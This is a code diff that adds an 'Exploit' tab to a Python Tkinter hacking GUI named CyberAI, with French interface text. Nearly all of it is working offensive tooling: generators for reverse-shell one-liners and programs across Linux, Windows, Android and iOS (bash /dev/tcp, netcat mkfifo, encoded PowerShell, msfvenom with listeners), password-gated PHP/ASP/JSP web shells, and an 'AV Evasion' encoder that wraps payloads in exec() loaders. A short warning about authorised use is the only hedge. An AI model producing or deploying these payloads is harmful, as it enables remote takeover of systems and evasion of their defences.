@@ -258,6 +258,7 @@ class CyberAI(tk.Tk):
             " Password ":  PasswordTab,
             " DoS ":       DoSTab,
             " Anonymity " : AnonymityTab,
+            " Exploit "   : ExploitTab,
         }
 
         for name, cls in tab_classes.items():
@@ -1598,6 +1599,599 @@ class AnonymityTab(BaseTab):
             if pm.username:
                 self.log(self.output, f"  Authentification: {pm.username}", "success")
         self.app.update_tor_status()
+
+
+# ════════════════════════ 8. EXPLOIT / PAYLOAD ════════════════════════
+class ExploitTab(BaseTab):
+    def __init__(self, parent, app):
+        super().__init__(parent, app)
+        self.build()
+
+    def build(self):
+        main = ttk.Frame(self.parent)
+        main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+
+        warn = ttk.LabelFrame(main, text="\u26a0 Avertissement")
+        warn.pack(fill=tk.X, pady=(0, 6))
+        ttk.Label(warn, text=(
+            "Usage strictement r\u00e9serv\u00e9 aux tests d'intrusion autoris\u00e9s et environnements contr\u00f4l\u00e9s. "
+            "L'utilisation non autoris\u00e9e est ill\u00e9gale."
+        ), foreground="red", wraplength=780).pack(padx=10, pady=6)
+
+        nb = ttk.Notebook(main)
+        nb.pack(fill=tk.BOTH, expand=True)
+
+        # ── Tab 1: Reverse Shells ──
+        rev_frame = ttk.Frame(nb)
+        nb.add(rev_frame, text="Reverse Shells")
+
+        f1 = ttk.LabelFrame(rev_frame, text="G\u00e9n\u00e9rateur de Payloads Multi-Plateforme")
+        f1.pack(fill=tk.X, padx=8, pady=8)
+
+        ttk.Label(f1, text="IP:").grid(row=0, column=0, padx=5, pady=4, sticky="w")
+        self.entry_rs_ip = ttk.Entry(f1, width=18, font=("TkDefaultFont", 11))
+        self.entry_rs_ip.grid(row=0, column=1, padx=5, pady=4, sticky="w")
+        self.entry_rs_ip.insert(0, "192.168.1.100")
+
+        ttk.Label(f1, text="Port:").grid(row=0, column=2, padx=5, pady=4, sticky="w")
+        self.entry_rs_port = ttk.Entry(f1, width=8, font=("TkDefaultFont", 11))
+        self.entry_rs_port.grid(row=0, column=3, padx=5, pady=4, sticky="w")
+        self.entry_rs_port.insert(0, "4444")
+
+        ttk.Label(f1, text="Plateforme:").grid(row=1, column=0, padx=5, pady=4, sticky="w")
+        self.rs_platform = tk.StringVar(value="linux")
+        pf = ttk.Frame(f1)
+        pf.grid(row=1, column=1, columnspan=3, padx=5, pady=4, sticky="w")
+        ttk.Radiobutton(pf, text="Linux", variable=self.rs_platform, value="linux").pack(side=tk.LEFT, padx=2)
+        ttk.Radiobutton(pf, text="Windows", variable=self.rs_platform, value="windows").pack(side=tk.LEFT, padx=2)
+        ttk.Radiobutton(pf, text="Android", variable=self.rs_platform, value="android").pack(side=tk.LEFT, padx=2)
+        ttk.Radiobutton(pf, text="iOS", variable=self.rs_platform, value="ios").pack(side=tk.LEFT, padx=2)
+        ttk.Radiobutton(pf, text="Cross", variable=self.rs_platform, value="cross").pack(side=tk.LEFT, padx=2)
+
+        ttk.Label(f1, text="Type:").grid(row=2, column=0, padx=5, pady=4, sticky="w")
+        self.rs_type = tk.StringVar(value="python")
+        self._type_frame = ttk.Frame(f1)
+        self._type_frame.grid(row=2, column=1, columnspan=3, padx=5, pady=4, sticky="w")
+        self._populate_type_buttons(self._type_frame)
+        self.rs_platform.trace_add("write", self._on_platform_change)
+
+        ttk.Button(f1, text="G\u00e9n\u00e9rer Payload", command=self.run_gen_payload, width=22).grid(row=3, column=0, columnspan=8, pady=6)
+
+        # ── Tab 2: Web Shells ──
+        web_frame = ttk.Frame(nb)
+        nb.add(web_frame, text="Web Shells")
+
+        f2 = ttk.LabelFrame(web_frame, text="G\u00e9n\u00e9rateur de Web Shell")
+        f2.pack(fill=tk.X, padx=8, pady=8)
+
+        self.ws_type = tk.StringVar(value="php")
+        ttk.Label(f2, text="Type:").grid(row=0, column=0, padx=5, pady=4, sticky="w")
+        ttk.Radiobutton(f2, text="PHP", variable=self.ws_type, value="php").grid(row=0, column=1, padx=2)
+        ttk.Radiobutton(f2, text="ASP", variable=self.ws_type, value="asp").grid(row=0, column=2, padx=2)
+        ttk.Radiobutton(f2, text="JSP", variable=self.ws_type, value="jsp").grid(row=0, column=3, padx=2)
+
+        self.ws_obfuscate = tk.BooleanVar(value=True)
+        ttk.Checkbutton(f2, text="Obscurcir (base64)", variable=self.ws_obfuscate).grid(row=0, column=4, padx=10)
+
+        self.entry_ws_pass = ttk.Entry(f2, width=15)
+        self.entry_ws_pass.insert(0, "cyberai")
+        ttk.Label(f2, text="Password:").grid(row=0, column=5, padx=5, pady=4, sticky="w")
+        self.entry_ws_pass.grid(row=0, column=6, padx=5, pady=4, sticky="w")
+
+        ttk.Button(f2, text="G\u00e9n\u00e9rer Web Shell", command=self.run_gen_webshell, width=22).grid(row=1, column=0, columnspan=7, pady=6)
+
+        # ── Tab 3: AV Evasion ──
+        evade_frame = ttk.Frame(nb)
+        nb.add(evade_frame, text="AV Evasion")
+
+        f3 = ttk.LabelFrame(evade_frame, text="Encodage / Obfuscation de Payload")
+        f3.pack(fill=tk.X, padx=8, pady=8)
+
+        ttk.Label(f3, text="Payload brut:").grid(row=0, column=0, padx=5, pady=4, sticky="nw")
+        self.entry_raw = scrolledtext.ScrolledText(f3, height=4, width=80, font=("Consolas", 9))
+        self.entry_raw.grid(row=0, column=1, columnspan=4, padx=5, pady=4)
+
+        self.evade_method = tk.StringVar(value="base64")
+        ttk.Radiobutton(f3, text="Base64", variable=self.evade_method, value="base64").grid(row=1, column=1, padx=3)
+        ttk.Radiobutton(f3, text="XOR (single-byte)", variable=self.evade_method, value="xor").grid(row=1, column=2, padx=3)
+        ttk.Radiobutton(f3, text="AES (CBC)", variable=self.evade_method, value="aes").grid(row=1, column=3, padx=3)
+        ttk.Radiobutton(f3, text="Split + Join", variable=self.evade_method, value="split").grid(row=1, column=4, padx=3)
+
+        ttk.Button(f3, text="Encoder", command=self.run_encode, width=15).grid(row=2, column=1, pady=6)
+        ttk.Button(f3, text="Encoder + Wrap Python", command=self.run_encode_wrap, width=22).grid(row=2, column=2, columnspan=2, pady=6)
+
+        # ── Output ──
+        self.output = self.make_output(main)
+
+    # ── Payload Types per Platform ──
+    def _populate_type_buttons(self, parent=None):
+        pf = self.rs_platform.get()
+        types = {
+            "linux":    ["python", "bash", "nc", "perl", "ruby"],
+            "windows":  ["powershell", "python", "nc", "msfvenom", "csharp"],
+            "android":  ["python", "bash", "java", "msfvenom", "termux"],
+            "ios":      ["python", "bash", "js", "msfvenom"],
+            "cross":    ["python", "bash", "nc", "perl", "ruby", "lua", "php"],
+        }
+        opts = types.get(pf, types["linux"])
+        f = parent if parent else self._type_frame
+        for c in f.winfo_children():
+            c.destroy()
+        self.rs_type = tk.StringVar(value=opts[0])
+        for t in opts:
+            tk.Radiobutton(f, text=t.capitalize(), variable=self.rs_type, value=t).pack(side=tk.LEFT, padx=2)
+
+    def _on_platform_change(self, *args):
+        if hasattr(self, "_type_frame"):
+            self._populate_type_buttons(self._type_frame)
+
+    # ── Payload Generator ──
+    def run_gen_payload(self):
+        self.clear(self.output)
+        ip = self.entry_rs_ip.get().strip()
+        port = self.entry_rs_port.get().strip()
+        if not ip or not port:
+            messagebox.showwarning("Attention", "Entrez IP et Port.")
+            return
+        self.run_thread(lambda: self.do_gen_payload(ip, port))
+
+    def do_gen_payload(self, ip, port):
+        platform = self.rs_platform.get()
+        ptype = self.rs_type.get()
+        self.log(self.output, f"Payload [{platform}] {ptype.upper()} — {ip}:{port}", "bold")
+        self.log(self.output, f"Commande d'\u00e9coute: nc -lvnp {port}\n")
+        self.log(self.output, "-" * 60)
+
+        if ptype == "python":
+            payload = (
+                f"# Python reverse shell — {platform}\n"
+                f'python3 -c "\n'
+                f'import socket,subprocess,os\n'
+                f's=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n'
+                f's.connect((\"{ip}\",{port}))\n'
+                f'os.dup2(s.fileno(),0)\n'
+                f'os.dup2(s.fileno(),1)\n'
+                f'os.dup2(s.fileno(),2)\n'
+                f'import pty\n'
+                f'pty.spawn(\"/bin/sh\")\n'
+                f'"'
+            )
+            if platform == "windows":
+                payload = (
+                    f"# Python reverse shell — Windows\n"
+                    f'python -c "\n'
+                    f'import socket,subprocess\n'
+                    f's=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n'
+                    f's.connect((\"{ip}\",{port}))\n'
+                    f'subprocess.call([\"cmd.exe\"],stdin=s.fileno(),\n'
+                    f'  stdout=s.fileno(),stderr=s.fileno())\n'
+                    f'"'
+                )
+
+        elif ptype == "bash":
+            payload = (
+                f"# Bash reverse shell — {platform}\n"
+                f"bash -i >& /dev/tcp/{ip}/{port} 0>&1\n\n"
+                f"# Alternative:\n"
+                f"exec 5<>/dev/tcp/{ip}/{port};cat <&5|while read l;do $l 2>&5 >&5;done"
+            )
+
+        elif ptype == "powershell":
+            b64 = self._ps_b64(ip, port)
+            payload = (
+                f"# PowerShell reverse shell — Windows\n"
+                f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {b64}\n\n"
+                f"# Alternative (one-liner):\n"
+                f'powershell -c "$c=New-Object Net.Sockets.TCPClient(\'{ip}\',{port});'
+                f'$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};'
+                f'while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);'
+                f'$sb=(iex $d 2>&1|Out-String);$sb2=$sb+\'PS \'+(pwd).Path+\'> \';'
+                f'$sb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()"'
+            )
+
+        elif ptype == "nc":
+            if platform in ("windows",):
+                payload = (
+                    f"# Netcat reverse shell — Windows\n"
+                    f"nc -e cmd.exe {ip} {port}\n"
+                    f"# Si nc.noconsole:\n"
+                    f"nc {ip} {port} -e cmd.exe"
+                )
+            else:
+                payload = (
+                    f"# Netcat reverse shell — Linux/Unix\n"
+                    f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f\n\n"
+                    f"# OpenBSD:\n"
+                    f"nc -e /bin/sh {ip} {port}"
+                )
+
+        elif ptype == "perl":
+            payload = (
+                f"# Perl reverse shell — Cross-platform\n"
+                f'perl -e \'use Socket;$i="{ip}";$p={port};'
+                f'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
+                f'if(connect(S,sockaddr_in($p,inet_aton($i)))){{'
+                f'open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");'
+                f'exec("/bin/sh -i");}};\'\n\n'
+                f"# Windows (Strawberry Perl):\n"
+                f'perl -MIO -e \'$c=IO::Socket::INET->new(PeerAddr=>"{ip}",PeerPort=>{port});'
+                f'STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''
+            )
+
+        elif ptype == "ruby":
+            payload = (
+                f"# Ruby reverse shell — Cross-platform\n"
+                f'ruby -rsocket -e \'c=TCPSocket.new("{ip}",{port});'
+                f'$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);'
+                f'$stdin.each_line{{|l|l=l.strip;next if l.length<1;'
+                f'(IO.popen(l,"r"){{|io|c.print io.read}})rescue c.print "error: #{{$!}}\\n"}}\'\n\n'
+                f"# Alternative:\n"
+                f'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("{ip}",{port});'
+                f'loop{{c.gets.chomp!;break if $_=="exit";'
+                f'IO.popen($_,?r){{|io|c.print io.read}}rescue c.print "error\\n"}}\''
+            )
+
+        elif ptype == "lua":
+            payload = (
+                f"# Lua reverse shell — Cross-platform\n"
+                f'lua -e \'local s=require("socket");'
+                f'local t=s.tcp();t:connect("{ip}",{port});'
+                f'while true do local r,x=t:receive();local f=io.popen(r,"r");'
+                f'local s=table.concat({{f:read("*a")}});t:send(s);end;'
+                f't:close();\'\n'
+            )
+
+        elif ptype == "php":
+            payload = (
+                f"# PHP reverse shell — Cross-platform\n"
+                f'php -r \'$s=fsockopen("{ip}",{port});'
+                f'exec("/bin/sh -i <&3 >&3 2>&3");\'\n\n'
+                f"# Windows:\n"
+                f'php -r \'$s=fsockopen("{ip}",{port});'
+                f'exec("cmd.exe <&3 >&3 2>&3");\'\n'
+            )
+
+        elif ptype == "java":
+            if platform == "android":
+                payload = (
+                    f"// Java reverse shell — Android\n"
+                    f'// Compile: javac Rev.java && dx --dex --output=rev.dex Rev.class\n'
+                    f'// Push: adb push rev.dex /data/local/tmp/\n'
+                    f'// Run: dalvikvm -cp /data/local/tmp/rev.dex Rev\n'
+                    f'import java.io.*;\n'
+                    f'import java.net.*;\n'
+                    f'public class Rev {{\n'
+                    f'  public static void main(String[] a) throws Exception {{\n'
+                    f'    Socket s=new Socket("{ip}",{port});\n'
+                    f'    BufferedReader r=new BufferedReader(new InputStreamReader(s.getInputStream()));\n'
+                    f'    PrintWriter w=new PrintWriter(s.getOutputStream(),true);\n'
+                    f'    while(true){{w.println(new java.util.Scanner(Runtime.getRuntime()'
+                    f'.exec(r.readLine()).getInputStream()).useDelimiter("\\\\A").next());}}\n'
+                    f'  }}\n'
+                    f'}}'
+                )
+            else:
+                payload = (
+                    f"// Java reverse shell — Cross-platform\n"
+                    f'// Compile: javac Rev.java && java Rev\n'
+                    f'import java.io.*;\n'
+                    f'import java.net.*;\n'
+                    f'public class Rev {{\n'
+                    f'  public static void main(String[] a) throws Exception {{\n'
+                    f'    Runtime r=Runtime.getRuntime();\n'
+                    f'    Process p=r.exec(new String[]{{"/bin/sh","-i"}});\n'
+                    f'    Socket s=new Socket("{ip}",{port});\n'
+                    f'    p.getInputStream().transferTo(s.getOutputStream());\n'
+                    f'    s.getInputStream().transferTo(p.getOutputStream());\n'
+                    f'  }}\n'
+                    f'}}'
+                )
+
+        elif ptype == "js":
+            payload = (
+                f"// JavaScript reverse shell — Node.js / iOS\n"
+                f'// Node.js:\n'
+                f'require("child_process").exec(\n'
+                f'  "bash -c \\"bash -i >& /dev/tcp/{ip}/{port} 0>&1\\"")\n\n'
+                f'// iOS (iSH shell):\n'
+                f'// M\u00eame que bash ci-dessus dans iSH\n'
+                f'// Ou avec Runtime:\n'
+                f'const {{exec}}=require("child_process");\n'
+                f'const net=require("net");\n'
+                f'const c=net.connect({port},"{ip}",()=>{{\n'
+                f'  exec("bash",(e,o)=>c.write(o));\n'
+                f'}});'
+            )
+
+        elif ptype == "msfvenom":
+            if platform == "android":
+                payload = (
+                    f"# MSFVenom — Android APK\n"
+                    f"msfvenom -p android/meterpreter/reverse_tcp "
+                    f"LHOST={ip} LPORT={port} -o payload.apk\n"
+                    f"# Signer:\n"
+                    f"jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 "
+                    f"-keystore my.keystore payload.apk alias\n\n"
+                    f"# Lancer l'\u00e9coute:\n"
+                    f"msfconsole -q -x 'use multi/handler; "
+                    f"set payload android/meterpreter/reverse_tcp; "
+                    f"set LHOST {ip}; set LPORT {port}; exploit'"
+                )
+            elif platform == "ios":
+                payload = (
+                    f"# MSFVenom — iOS (IPA)\n"
+                    f"msfvenom -p ios/meterpreter/reverse_tcp "
+                    f"LHOST={ip} LPORT={port} -o payload.ipa\n\n"
+                    f"# Lancer l'\u00e9coute:\n"
+                    f"msfconsole -q -x 'use multi/handler; "
+                    f"set payload ios/meterpreter/reverse_tcp; "
+                    f"set LHOST {ip}; set LPORT {port}; exploit'"
+                )
+            elif platform == "windows":
+                payload = (
+                    f"# MSFVenom — Windows EXE\n"
+                    f"msfvenom -p windows/meterpreter/reverse_tcp "
+                    f"LHOST={ip} LPORT={port} -f exe -o payload.exe\n\n"
+                    f"# Encoded (AV evasion):\n"
+                    f"msfvenom -p windows/meterpreter/reverse_tcp "
+                    f"LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -i 5 "
+                    f"-f exe -o payload_encoded.exe\n\n"
+                    f"# PowerShell:\n"
+                    f"msfvenom -p windows/x64/meterpreter/reverse_tcp "
+                    f"LHOST={ip} LPORT={port} -f psh-reflection -o payload.ps1"
+                )
+            else:
+                payload = (
+                    f"# MSFVenom — Linux ELF\n"
+                    f"msfvenom -p linux/x64/meterpreter/reverse_tcp "
+                    f"LHOST={ip} LPORT={port} -f elf -o payload.elf\n\n"
+                    f"# Python:\n"
+                    f"msfvenom -p python/meterpreter/reverse_tcp "
+                    f"LHOST={ip} LPORT={port} -o payload.py\n\n"
+                    f"# Lancer l'\u00e9coute:\n"
+                    f"msfconsole -q -x 'use multi/handler; "
+                    f"set payload linux/x64/meterpreter/reverse_tcp; "
+                    f"set LHOST {ip}; set LPORT {port}; exploit'"
+                )
+
+        elif ptype == "csharp":
+            payload = (
+                f"// C# reverse shell — Windows\n"
+                f'// Compile: csc shell.cs\n'
+                f'using System;\n'
+                f'using System.Net.Sockets;\n'
+                f'using System.Diagnostics;\n'
+                f'class Shell {{\n'
+                f'  static void Main() {{\n'
+                f'    var c=new TcpClient("{ip}",{port});\n'
+                f'    var s=c.GetStream();\n'
+                f'    var p=new Process();\n'
+                f'    p.StartInfo.FileName="cmd.exe";\n'
+                f'    p.StartInfo.UseShellExecute=false;\n'
+                f'    p.StartInfo.RedirectStandardInput=true;\n'
+                f'    p.StartInfo.RedirectStandardOutput=true;\n'
+                f'    p.StartInfo.RedirectStandardError=true;\n'
+                f'    p.Start();\n'
+                f'    p.StandardInput.BaseStream.CopyTo(s);\n'
+                f'    s.CopyTo(p.StandardInput.BaseStream);\n'
+                f'    p.WaitForExit();\n'
+                f'  }}\n'
+                f'}}'
+            )
+
+        elif ptype == "termux":
+            payload = (
+                f"# Termux reverse shell — Android\n"
+                f"# Installer: pkg install python -y\n"
+                f"# Puis lancer le payload Python ci-dessous:\n\n"
+                f'python3 -c "\n'
+                f'import socket,subprocess,os\n'
+                f's=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n'
+                f's.connect((\"{ip}\",{port}))\n'
+                f'os.dup2(s.fileno(),0)\n'
+                f'os.dup2(s.fileno(),1)\n'
+                f'os.dup2(s.fileno(),2)\n'
+                f'os.system(\"/data/data/com.termux/files/usr/bin/bash\")\n'
+                f'"\n\n'
+                f"# Alternative avec NC:\n"
+                f"pkg install netcat-openbsd -y\n"
+                f"rm /data/data/com.termux/files/usr/tmp/f;"
+                f"mkfifo /data/data/com.termux/files/usr/tmp/f;"
+                f"cat /data/data/com.termux/files/usr/tmp/f|/data/data/com.termux/files/usr/bin/bash -i 2>&1|"
+                f"nc {ip} {port} >/data/data/com.termux/files/usr/tmp/f"
+            )
+
+        else:
+            payload = f"# Payload non trouv\u00e9 pour {platform}/{ptype}"
+
+        self.log(self.output, payload, "success")
+        self.log(self.output, "\n\u2139\ufe0f Collez/ex\u00e9cutez sur la cible, puis \u00e9coutez avec nc.", "bold")
+
+    def _ps_b64(self, ip, port):
+        import base64
+        code = (
+            f"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
+            f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
+            f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{"
+            f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
+            f"$sb=(iex $d 2>&1|Out-String);"
+            f"$sb2=$sb+'PS '+(pwd).Path+'> ';"
+            f"$sb=([text.encoding]::ASCII).GetBytes($sb2);"
+            f"$s.Write($sb,0,$sb.Length);$s.Flush()}}"
+            f"$c.Close()"
+        )
+        return base64.b64encode(code.encode("utf-16le")).decode()
+
+    # ── Web Shell Generator ──
+    def run_gen_webshell(self):
+        self.clear(self.output)
+        self.run_thread(lambda: self.do_gen_webshell())
+
+    def do_gen_webshell(self):
+        ws_type = self.ws_type.get()
+        pwd = self.entry_ws_pass.get().strip() or "cyberai"
+        obfuscate = self.ws_obfuscate.get()
+
+        if ws_type == "php":
+            if obfuscate:
+                shell = (
+                    f'<?php\n'
+                    f'$p="{pwd}";\n'
+                    f'if(isset($_REQUEST["$p"])){{\n'
+                    f'  $c=base64_decode($_REQUEST["c"]);\n'
+                    f'  system($c);\n'
+                    f'}}\n'
+                    f'?>\n'
+                    f'<!-- Usage: ?{pwd}&c=base64(command) -->'
+                )
+            else:
+                shell = (
+                    f'<?php\n'
+                    f'$p="{pwd}";\n'
+                    f'if(isset($_REQUEST["$p"])){{\n'
+                    f'  system($_REQUEST["c"]);\n'
+                    f'}}\n'
+                    f'?>\n'
+                    f'<!-- Usage: ?{pwd}&c=command -->'
+                )
+        elif ws_type == "asp":
+            shell = (
+                f'<%\n'
+                f'Dim p:{p}=Request("{pwd}")\n'
+                f'If p <> "" Then\n'
+                f'  Execute(p)\n'
+                f'End If\n'
+                f'%>\n'
+                f'<!-- Usage: ?{pwd}=Response.Write(server.createobject("WScript.Shell").exec("cmd /c whoami").stdout.readall) -->'
+            )
+        elif ws_type == "jsp":
+            shell = (
+                f'<%@ page import="java.io.*" %>\n'
+                f'<%\n'
+                f'  String c = request.getParameter("{pwd}");\n'
+                f'  if(c != null) {{\n'
+                f'    Process p = Runtime.getRuntime().exec(c);\n'
+                f'    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n'
+                f'    String l;while((l=br.readLine())!=null) out.println(l);\n'
+                f'  }}\n'
+                f'%>\n'
+                f'<!-- Usage: ?{pwd}=whoami -->'
+            )
+        else:
+            shell = "Type non support\u00e9."
+
+        self.log(self.output, f"Web Shell ({ws_type.upper()}) — password: {pwd}", "bold")
+        self.log(self.output, shell, "success")
+
+    # ── AV Evasion ──
+    def run_encode(self):
+        self.clear(self.output)
+        self.run_thread(lambda: self.do_encode())
+
+    def do_encode(self):
+        raw = self.entry_raw.get("1.0", tk.END).strip()
+        if not raw:
+            messagebox.showwarning("Attention", "Entrez un payload brut.")
+            return
+        method = self.evade_method.get()
+        result = self.encode_payload(raw, method)
+        self.log(self.output, f"Payload original ({len(raw)} octets):", "bold")
+        self.log(self.output, raw)
+        self.log(self.output, f"\nPayload encod\u00e9 ({method}):", "bold")
+        self.log(self.output, result, "success")
+
+    def run_encode_wrap(self):
+        self.clear(self.output)
+        self.run_thread(lambda: self.do_encode_wrap())
+
+    def do_encode_wrap(self):
+        raw = self.entry_raw.get("1.0", tk.END).strip()
+        if not raw:
+            messagebox.showwarning("Attention", "Entrez un payload brut.")
+            return
+        method = self.evade_method.get()
+        encoded = self.encode_payload(raw, method)
+
+        if method == "base64":
+            wrapper = (
+                f'import base64,os\n'
+                f'exec(base64.b64decode("{encoded}").decode())\n'
+            )
+        elif method == "xor":
+            key_match = encoded.split(":")[0]
+            data = encoded.split(":")[1]
+            wrapper = (
+                f'import os\n'
+                f'key={key_match}\n'
+                f'enc={data}\n'
+                f'dec=bytes(k^key for k in enc)\n'
+                f'exec(dec.decode())\n'
+            )
+        elif method == "aes":
+            wrapper = (
+                f'from Crypto.Cipher import AES\n'
+                f'import base64,os\n'
+                f'key=base64.b64decode("{encoded[:44]}")\n'
+                f'iv=base64.b64decode("{encoded[44:88]}")\n'
+                f'c=AES.new(key,AES.MODE_CBC,iv)\n'
+                f'exec(c.decrypt(base64.b64decode("{encoded[88:]}")).decode())\n'
+            )
+        elif method == "split":
+            parts = encoded.split(":")
+            wrapper = (
+                f'import os\n'
+                f'p={parts}\n'
+                f'exec("".join(p))\n'
+            )
+        else:
+            wrapper = encoded
+
+        self.log(self.output, f"Payload encod\u00e9 + wrapper Python ({method}):", "bold")
+        self.log(self.output, wrapper, "success")
+
+    def encode_payload(self, raw, method):
+        if method == "base64":
+            import base64
+            return base64.b64encode(raw.encode()).decode()
+        elif method == "xor":
+            key = random.randint(1, 255)
+            data = bytes(k ^ key for k in raw.encode())
+            return f"{key}:{list(data)}"
+        elif method == "aes":
+            try:
+                from Crypto.Cipher import AES
+                import base64
+                key = os.urandom(32)
+                iv = os.urandom(16)
+                raw_padded = raw.encode()
+                while len(raw_padded) % 16 != 0:
+                    raw_padded += b"\x00"
+                c = AES.new(key, AES.MODE_CBC, iv)
+                ct = c.encrypt(raw_padded)
+                return base64.b64encode(key).decode() + base64.b64encode(iv).decode() + base64.b64encode(ct).decode()
+            except ImportError:
+                return "pycryptodome non install\u00e9. Utilisez base64 ou XOR."
+        elif method == "split":
+            parts = [raw[i:i+20] for i in range(0, len(raw), 20)]
+            return ":".join(parts)
+        return raw
+
+    # ── Exploit Checker ──
+    def run_exploit_check(self):
+        self.clear(self.output)
+        target = self.entry_rs_ip.get().strip()
+        if not target:
+            messagebox.showwarning("Attention", "Entrez une IP cible.")
+            return
+        self.run_thread(lambda: self.do_exploit_check(target))
+
+    def do_exploit_check(self, target):
+        self.log(self.output, f"Analyse des exploits potentiels pour {target}...", "bold")
+        self.log(self.output, "[!] Module en cours de d\u00e9veloppement.", "warning")
+        self.log(self.output, "  Fonctionnalit\u00e9s \u00e0 venir:", "bold")
+        self.log(self.output, "  - Scan CVE par service/banni\u00e8re")
+        self.log(self.output, "  - Auto-exploitation SMB/SSH/FTP")
+        self.log(self.output, "  - Matching avec base de donn\u00e9es Exploit-DB")
 
 
 # ════════════════════════ MAIN ════════════════════════
